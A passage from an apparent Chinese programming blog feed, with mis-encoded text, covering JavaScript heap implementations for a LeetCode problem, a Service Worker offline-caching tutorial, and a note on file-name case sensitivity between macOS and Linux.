href="#Offer40-æœ€å°çš„Kä¸ªæ•°" class="headerlink" title="Offer40.æœ€å°çš„Kä¸ªæ•°"></a><strong>Offer40.æœ€å°çš„Kä¸ªæ•°</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinHeap</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span> (nums) &#123;&#125; <span class="comment">// æ¥å—ä¸€ä¸ªæ•°ç»„ï¼Œä¸€å¼€å§‹å¯¹numsè¿›è¡Œå †æ’åº</span></span><br><span class="line">  insert (num) &#123;&#125; <span class="comment">// å¾€å †é‡Œæ’å…¥å…ƒç´ </span></span><br><span class="line">  removeMin () &#123;&#125; <span class="comment">// è·å–å †é¡¶å…ƒç´ </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> getLeastNumbers = <span class="function"><span class="keyword">function</span>(<span class="params">arr, k</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> heap = <span class="keyword">new</span> MinHeap(arr)</span><br><span class="line">  <span class="keyword">const</span> result = []</span><br><span class="line">  <span class="keyword">while</span> (k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    result.push(heap.removeMin())</span><br><span class="line">    k--</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ï¼Œ<code>MinHeap</code>æœ€å°å †æ€ä¹ˆå®ç°å‘¢ï¼Ÿç”±äºJSæ²¡æœ‰å †è¿™ç§åŸºç¡€æ•°æ®ï¼Œæˆ‘ä»¬è¦è‡ªå·±æ‰‹åŠ¨å®ç°å †ã€‚</p><p><br></p><h3 id="3-JSå¦‚ä½•å®ç°å †"><a href="#3-JSå¦‚ä½•å®ç°å †" class="headerlink" title="3. JSå¦‚ä½•å®ç°å †"></a>3. JSå¦‚ä½•å®ç°å †</h3><h4 id="3-1-å¦‚ä½•è¡¨ç¤ºä¸€ä¸ªå †"><a href="#3-1-å¦‚ä½•è¡¨ç¤ºä¸€ä¸ªå †" class="headerlink" title="3.1 å¦‚ä½•è¡¨ç¤ºä¸€ä¸ªå †"></a>3.1 å¦‚ä½•è¡¨ç¤ºä¸€ä¸ªå †</h4><p>å®Œå…¨äºŒå‰æ ‘é€‚åˆç”¨æ•°ç»„æ¥å­˜å‚¨ã€‚æˆ‘ä»¬ä¸éœ€è¦å­˜å‚¨å·¦å³å­èŠ‚ç‚¹çš„æŒ‡é’ˆï¼Œå•çº¯é€šè¿‡æ•°ç»„çš„ä¸‹æ ‡ï¼Œå°±å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªèŠ‚ç‚¹çš„å·¦å³å­èŠ‚ç‚¹å’Œçˆ¶èŠ‚ç‚¹ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">7</span></span><br><span class="line">  /   \</span><br><span class="line">  <span class="number">5</span>     <span class="number">6</span></span><br><span class="line">/ \   /  \</span><br><span class="line"><span class="number">4</span>  <span class="number">2</span>  <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç”¨æ•°ç»„å­˜å‚¨å †çš„ä¾‹å­</span></span><br><span class="line"><span class="comment">// ä¸‹æ ‡ä¸ºiçš„èŠ‚ç‚¹, å…¶å·¦å­èŠ‚ç‚¹çš„ä¸‹æ ‡æ˜¯ i * 2ï¼Œå…¶å³å­èŠ‚ç‚¹çš„ä¸‹æ ‡æ˜¯ i * 2 + 1, å…¶çˆ¶èŠ‚ç‚¹ä¸‹æ ‡ä¸º Math.floor(i / 2)</span></span><br><span class="line">[<span class="literal">undefined</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-å®ç°å¤§é¡¶å †"><a href="#3-2-å®ç°å¤§é¡¶å †" class="headerlink" title="3.2 å®ç°å¤§é¡¶å †"></a>3.2 å®ç°å¤§é¡¶å †</h4><p>ä¿è¯å †é¡¶å…ƒç´ æœ€å¤§<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">- å¾€å †ä¸­æ’å…¥ä¸€ä¸ªå…ƒç´ </span></span><br><span class="line"><span class="comment">ã€ ä»ä¸‹å¾€ä¸Šçš„å †åŒ–æ–¹æ³• ã€‘æ’å…¥åä½¿å…¶é‡æ–°æ»¡è¶³å †çš„ç‰¹æ€§ï¼Œè¿™ä¸ªè¿‡ç¨‹ï¼Œå«åšå †åŒ–(heapify)ã€‚æŠŠèŠ‚ç‚¹æ”¾åœ¨æœ€åï¼Œå¦‚æœä¸æ»¡è¶³å­èŠ‚ç‚¹å°äºç­‰äºçˆ¶èŠ‚ç‚¹çš„å¤§å°å…³ç³»ï¼Œå°±äº’æ¢ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œä¸€ç›´é‡å¤è¿™ä¸ªè¿‡ç¨‹ï¼Œç›´åˆ°æ»¡è¶³è¿™ç§å¤§å°å…³ç³»ã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">- åˆ é™¤å †é¡¶å…ƒç´ </span></span><br><span class="line"><span class="comment">ä»»ä½•èŠ‚ç‚¹çš„å€¼éƒ½å¤§äºç­‰äºï¼ˆæˆ–å°äºç­‰äºï¼‰å­æ ‘èŠ‚ç‚¹çš„å€¼ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå †é¡¶å…ƒç´ å°±æ˜¯å †ä¸­æ•°æ®çš„æœ€å¤§å€¼æˆ–æœ€å°å€¼ã€‚</span></span><br><span class="line"><span class="comment">ã€ ä»ä¸Šå¾€ä¸‹çš„å †åŒ–æ–¹æ³• ã€‘æˆ‘ä»¬æŠŠæœ€åä¸€ä¸ªèŠ‚ç‚¹æ”¾åˆ°å †é¡¶ï¼Œç„¶ååˆ©ç”¨åŒæ ·çš„çˆ¶å­èŠ‚ç‚¹å¯¹æ¯”æ–¹æ³•ã€‚å¯¹äºä¸æ»¡è¶³çˆ¶å­èŠ‚ç‚¹å…³ç³»çš„ï¼Œäº’æ¢ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œå¹¶é‡å¤è¿›è¡Œè¿™ä¸ªè¿‡ç¨‹ã€‚</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">const</span> swap = <span class="function">(<span class="params">arr, idx1, idx2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> temp = arr[idx1]</span><br><span class="line">  arr[idx1] = arr[idx2]</span><br><span class="line">  arr[idx2] = temp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaxHeap</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span> (arr) &#123;</span><br><span class="line">    <span class="keyword">this</span>.arr = [] <span class="comment">// ä»ä¸‹æ ‡1å¼€å§‹å­˜å‚¨æ•°æ®</span></span><br><span class="line">    <span class="keyword">this</span>.count = <span class="number">0</span> <span class="comment">// å †å·²ç»å­˜å‚¨çš„æ•°æ®ä¸ªæ•°</span></span><br><span class="line">    arr.forEach(<span class="function"><span class="params">v</span> =&gt;</span> <span class="keyword">this</span>.insert(v))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  insert (data) &#123;</span><br><span class="line">    <span class="keyword">this</span>.count++</span><br><span class="line">    <span class="keyword">this</span>.arr[<span class="keyword">this</span>.count] = data</span><br><span class="line">    <span class="keyword">let</span> i = <span class="keyword">this</span>.count</span><br><span class="line">    <span class="comment">// æŠŠèŠ‚ç‚¹æ”¾åœ¨æœ€åï¼Œå¯¹æ¯”å½“å‰èŠ‚ç‚¹ä¸çˆ¶èŠ‚ç‚¹çš„å…³ç³»ï¼Œå¦‚æœä¸æ»¡è¶³ï¼Œåˆ™äº’æ¢èŠ‚ç‚¹</span></span><br><span class="line">    <span class="keyword">while</span> ((i / <span class="number">2</span> | <span class="number">0</span>) &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">this</span>.arr[i] &gt; <span class="keyword">this</span>.arr[(i / <span class="number">2</span> | <span class="number">0</span>)]) &#123; <span class="comment">// è‡ªä¸‹å¾€ä¸Šå †åŒ–</span></span><br><span class="line">      swap(<span class="keyword">this</span>.arr, i, (i / <span class="number">2</span> | <span class="number">0</span>))</span><br><span class="line">      i = i / <span class="number">2</span> | <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  removeMax () &#123;</span><br><span class="line">    <span class="keyword">const</span> heapify = <span class="function">(<span class="params">arr, n, i</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">while</span> (<span class="literal">true</span>) &#123; <span class="comment">// è‡ªä¸Šå¾€ä¸‹å †åŒ–</span></span><br><span class="line">        <span class="keyword">let</span> maxPos = i</span><br><span class="line">        <span class="keyword">if</span> (i*<span class="number">2</span> &lt;= n &amp;&amp; arr[i] &lt; arr[i*<span class="number">2</span>]) maxPos = i*<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (i*<span class="number">2</span>+<span class="number">1</span> &lt;= n &amp;&amp; arr[maxPos] &lt; arr[i*<span class="number">2</span>+<span class="number">1</span>]) maxPos = i*<span class="number">2</span>+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (maxPos == i) <span class="keyword">break</span></span><br><span class="line">        swap(arr, i, maxPos)</span><br><span class="line">        i = maxPos</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.count === <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span> <span class="comment">// å †ä¸­æ²¡æœ‰æ•°æ®</span></span><br><span class="line">    <span class="keyword">const</span> max = <span class="keyword">this</span>.arr[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">this</span>.arr[<span class="number">1</span>] = <span class="keyword">this</span>.arr[<span class="keyword">this</span>.count]</span><br><span class="line">    <span class="keyword">this</span>.count--</span><br><span class="line">    heapify(<span class="keyword">this</span>.arr, <span class="keyword">this</span>.count, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> max</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-3-å®ç°å°é¡¶å †"><a href="#3-3-å®ç°å°é¡¶å †" class="headerlink" title="3.3 å®ç°å°é¡¶å †"></a>3.3 å®ç°å°é¡¶å †</h4><p>ä¿è¯å †é¡¶å…ƒç´ æœ€å°<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> swap = <span class="function">(<span class="params">arr, idx1, idx2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> temp = arr[idx1]</span><br><span class="line">  arr[idx1] = arr[idx2]</span><br><span class="line">  arr[idx2] = temp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinHeap</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span> (arr) &#123;</span><br><span class="line">    <span class="keyword">this</span>.arr = [] <span class="comment">// ä»ä¸‹æ ‡1å¼€å§‹å­˜å‚¨æ•°æ®</span></span><br><span class="line">    <span class="keyword">this</span>.count = <span class="number">0</span> <span class="comment">// å †å·²ç»å­˜å‚¨çš„æ•°æ®ä¸ªæ•°</span></span><br><span class="line">    arr.forEach(<span class="function"><span class="params">v</span> =&gt;</span> <span class="keyword">this</span>.insert(v)) <span class="comment">// å»ºå †</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  insert (data) &#123;</span><br><span class="line">    <span class="keyword">this</span>.count++</span><br><span class="line">    <span class="keyword">this</span>.arr[<span class="keyword">this</span>.count] = data</span><br><span class="line">    <span class="keyword">let</span> i = <span class="keyword">this</span>.count</span><br><span class="line">    <span class="comment">// æŠŠèŠ‚ç‚¹æ”¾åœ¨æœ€åï¼Œå¯¹æ¯”å½“å‰èŠ‚ç‚¹ä¸çˆ¶èŠ‚ç‚¹çš„å…³ç³»ï¼Œå¦‚æœä¸æ»¡è¶³ï¼Œåˆ™äº’æ¢èŠ‚ç‚¹</span></span><br><span class="line">    <span class="keyword">while</span> (i/<span class="number">2</span>|<span class="number">0</span> &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">this</span>.arr[i] &lt; <span class="keyword">this</span>.arr[i/<span class="number">2</span>|<span class="number">0</span>]) &#123;</span><br><span class="line">      swap(<span class="keyword">this</span>.arr, i, (i / <span class="number">2</span> | <span class="number">0</span>))</span><br><span class="line">      i = i / <span class="number">2</span> | <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  removeMin () &#123;</span><br><span class="line">    <span class="keyword">const</span> heapify = <span class="function">(<span class="params">arr, n, i</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">while</span> (<span class="literal">true</span>) &#123; <span class="comment">// è‡ªä¸Šå¾€ä¸‹å †åŒ–</span></span><br><span class="line">        <span class="keyword">let</span> maxPos = i</span><br><span class="line">        <span class="keyword">if</span> (i*<span class="number">2</span> &lt;= n &amp;&amp; arr[i] &gt; arr[i*<span class="number">2</span>]) maxPos = i*<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (i*<span class="number">2</span>+<span class="number">1</span> &lt;= n &amp;&amp; arr[maxPos] &gt; arr[i*<span class="number">2</span>+<span class="number">1</span>]) maxPos = i*<span class="number">2</span>+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (maxPos == i) <span class="keyword">break</span></span><br><span class="line">        swap(arr, i, maxPos)</span><br><span class="line">        i = maxPos</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.count === <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span> <span class="comment">// å †ä¸­æ²¡æœ‰æ•°æ®</span></span><br><span class="line">    <span class="keyword">const</span> min = <span class="keyword">this</span>.arr[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">this</span>.arr[<span class="number">1</span>] = <span class="keyword">this</span>.arr[<span class="keyword">this</span>.count]</span><br><span class="line">    <span class="keyword">this</span>.count--</span><br><span class="line">    heapify(<span class="keyword">this</span>.arr, <span class="keyword">this</span>.count, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> min</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Service Worker å®ç°ç¦»çº¿é¡µé¢è®¿é—®</title>
      <link href="/2021/08/20/ServiceWorker/"/>
      <url>/2021/08/20/ServiceWorker/</url>
      <content type="html"><![CDATA[<p>æœ€è¿‘çœ‹Vueçš„å®˜æ–¹æ–‡æ¡£çš„æ—¶å€™ï¼Œå‘ç°æ²¡æœ‰ç½‘çš„æ—¶å€™ï¼Œé¡µé¢è¿˜æ˜¯å¯ä»¥è¢«åˆ·å‡ºæ¥ï¼Œä¸€çœ‹â€¦æ©ï¼ŒserviceWorker<br>æˆ‘çš„åšå®¢ä¹Ÿè¦æ¥ä¸€å¥—ï¼Œèµ°èµ·~</p><p><img src="/2021/08/20/ServiceWorker/1.jpg" style="width: 500px"></p><p>å…ˆçœ‹çœ‹Vueæ˜¯æ€ä¹ˆå®ç°çš„<br><a href="https://cn.vuejs.org/service-worker.js" target="_blank" rel="noopener">https://cn.vuejs.org/service-worker.js</a></p><p>è¦å®ç°çš„æ•ˆæœ</p><ul><li>è¯·æ±‚èµ„æºæˆåŠŸï¼Œç¼“å­˜è¿›serviceWorker</li><li>æ²¡ç½‘çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä»serviceWorkerå–å‡ºèµ„æº</li><li>èµ„æºæ›´æ–°æ—¶ï¼Œä¼šæ‹‰å»æ–°çš„èµ„æº</li><li>æœ‰ä¸€å¤©ä¸æƒ³ç”¨serviceWorkeräº†ï¼Œå¯ä»¥å¸è½½</li></ul><p><br></p><h3 id="1-Service-Worker"><a href="#1-Service-Worker" class="headerlink" title="1. Service Worker"></a>1. Service Worker</h3><p>Service Workeré‡‡ç”¨JavaScriptæ§åˆ¶å…³è”çš„é¡µé¢æˆ–è€…ç½‘ç«™ï¼Œæ‹¦æˆªå¹¶ä¿®æ”¹è®¿é—®å’Œèµ„æºè¯·æ±‚ï¼Œç»†ç²’åº¦åœ°ç¼“å­˜èµ„æºã€‚ä½ å¯ä»¥å®Œå…¨æ§åˆ¶åº”ç”¨åœ¨ç‰¹å®šæƒ…å½¢ï¼ˆæœ€å¸¸è§çš„æƒ…å½¢æ˜¯ç½‘ç»œä¸å¯ç”¨ï¼‰ä¸‹çš„è¡¨ç°ã€‚</p><ul><li>Service workerè¿è¡Œåœ¨workerä¸Šä¸‹æ–‡ï¼Œå› æ­¤å®ƒä¸èƒ½è®¿é—®DOMã€‚</li><li>ç›¸å¯¹äºé©±åŠ¨åº”ç”¨çš„ä¸»JavaScriptçº¿ç¨‹ï¼Œå®ƒè¿è¡Œåœ¨å…¶ä»–çº¿ç¨‹ä¸­ï¼Œæ‰€ä»¥ä¸ä¼šé€ æˆé˜»å¡ã€‚</li><li>å‡ºäºå®‰å…¨è€ƒé‡ï¼ŒService workersåªèƒ½ç”±HTTPSæ‰¿è½½ï¼Œæ¯•ç«Ÿä¿®æ”¹ç½‘ç»œè¯·æ±‚çš„èƒ½åŠ›æš´éœ²ç»™ä¸­é—´äººæ”»å‡»ä¼šéå¸¸å±é™©ã€‚</li><li>è¢«installåå°±æ°¸è¿œå­˜åœ¨ï¼Œé™¤éè¢«æ‰‹åŠ¨å¸è½½</li></ul><p><br></p><h3 id="2-å®ç°èµ„æºæ‹¦æˆª"><a href="#2-å®ç°èµ„æºæ‹¦æˆª" class="headerlink" title="2. å®ç°èµ„æºæ‹¦æˆª"></a>2. å®ç°èµ„æºæ‹¦æˆª</h3><p>è¯·æ±‚æˆåŠŸæ—¶ï¼Œæ­£å¸¸è¿”å›è¯·æ±‚å†…å®¹ï¼Œå°†èµ„æºç¼“å­˜èµ·æ¥ã€‚æ²¡ç½‘çš„æ—¶å€™è¿”å›ç¼“å­˜èµ„æºã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ³¨å†ŒSevice worker</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">"load"</span>, event =&gt; &#123;</span><br><span class="line">  <span class="comment">// åˆ¤æ–­æµè§ˆå™¨æ˜¯å¦æ”¯æŒ</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="string">"serviceWorker"</span> <span class="keyword">in</span> navigator) &#123;</span><br><span class="line">    <span class="built_in">window</span>.navigator.serviceWorker</span><br><span class="line">      .register(<span class="string">"/sw.js"</span>, &#123;</span><br><span class="line">        scope: <span class="string">"/"</span></span><br><span class="line">      &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// èµ„æºæ‹¦æˆª</span></span><br><span class="line"><span class="keyword">const</span> VERSION = <span class="string">'1.0.0'</span></span><br><span class="line"><span class="keyword">this</span>.addEventListener(<span class="string">"fetch"</span>, event =&gt; &#123;</span><br><span class="line">  event.respondWith(</span><br><span class="line">    caches.match(event.request).then(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> request = event.request.clone();</span><br><span class="line">      <span class="keyword">return</span> fetch(request).then(<span class="function"><span class="params">httpRes</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// httpè¯·æ±‚çš„è¿”å›å·²è¢«æŠ“åˆ°ï¼Œå¯ä»¥å¤„ç½®äº†ã€‚</span></span><br><span class="line">        <span class="comment">// è¯·æ±‚å¤±è´¥äº†ï¼Œç›´æ¥è¿”å›å¤±è´¥çš„ç»“æœå°±å¥½äº†ã€‚ã€‚</span></span><br><span class="line">        <span class="keyword">if</span> (!httpRes || httpRes.status !== <span class="number">200</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> httpRes;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¯·æ±‚æˆåŠŸçš„è¯ï¼Œå°†è¯·æ±‚ç¼“å­˜èµ·æ¥ã€‚</span></span><br><span class="line">        <span class="keyword">let</span> responseClone = httpRes.clone();</span><br><span class="line">        caches.open(VERSION).then(<span class="function"><span class="params">cache</span> =&gt;</span> &#123;</span><br><span class="line">          cache.put(event.request, responseClone);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> httpRes;</span><br><span class="line">      &#125;, err =&gt; &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœ Service Workder ä¹‹å‰å­˜å‚¨äº†è¯¥èµ„æºï¼Œè¿”å›è¯¥èµ„æº</span></span><br><span class="line">        <span class="keyword">if</span> (response) &#123;</span><br><span class="line">          <span class="keyword">return</span> response;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>æ–­ç½‘äº†å†åˆ·æ–°è¿™ä¸ªé¡µé¢è¯•è¯•ï¼Œå¯ä»¥äº†~</p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://juejin.cn/post/6844903906670018568" target="_blank" rel="noopener">Service Workerç¦»çº¿ç¼“å­˜å®è·µ</a></li><li><a href="https://zhuanlan.zhihu.com/p/115243059" target="_blank" rel="noopener">service worker æ˜¯ä»€ä¹ˆï¼Ÿçœ‹è¿™ç¯‡å°±å¤Ÿäº†</a></li><li><a href="https://cloud.tencent.com/developer/article/1617365" target="_blank" rel="noopener">Service Workerç¦»çº¿ç¼“å­˜å®æˆ˜</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>è¶£è°ˆç½‘ç»œåè®®</title>
      <link href="/2021/08/20/%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
      <url>/2021/08/20/%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/</url>
      <content type="html"><![CDATA[]]></content>
      
      
    </entry>
    
    <entry>
      <title>macç³»ç»Ÿä¸åŒºåˆ†å¤§å°å†™ï¼ŒlinuxæœåŠ¡å™¨åŒºåˆ†å¤§å°å†™</title>
      <link href="/2021/08/20/Bug-%E5%A4%A7%E5%B0%8F%E5%86%99/"/>
      <url>/2021/08/20/Bug-%E5%A4%A7%E5%B0%8F%E5%86%99/</url>
      <content type="html"><![CDATA[<p>macOS é»˜è®¤æ˜¯ä¸åŒºåˆ†æ–‡ä»¶è·¯å¾„ä¸­çš„å¤§å°å†™çš„ï¼Œè€Œ Linux ç³»ç»Ÿä¸€èˆ¬æ˜¯åŒºåˆ†å¤§å°å†™çš„ã€‚<br>å¾ˆå¤šåŒå­¦çš„å¼€å‘ç¯å¢ƒéƒ½æ˜¯ macOS ï¼Œè€Œå‘å¸ƒã€éƒ¨ç½²ç¯å¢ƒéƒ½æ˜¯ Linux ã€‚</p><p>å½“ä½ <code>import</code>ä¸€ä¸ªæ–‡ä»¶<code>list.js</code>ï¼Œä½†æ˜¯å†™æˆäº†<code>List.js</code>ï¼Œmacä¸Šæ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> List <span class="keyword">from</span> <span class="string">'List'</span></span><br></pre></td></tr></table></figure></p><p>ä½†ä»£ç pushåˆ°linuxç¼–è¯‘æœºä¸Šå°±ä¼šæŠ¥æ‰¾ä¸åˆ°<code>List.js</code>çš„é”™è¯¯ã€‚</p>]]></content>
      
      <categories>
          
          <category> Bug </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>æ’åº</title>
      <link href="/2021/08/19/Leetcode-%E6%8E%92%E5%BA%8F/"/>
      <url>/2021/08/19/Leetcode-%E6%8E%92%E5%BA%8F/</url>
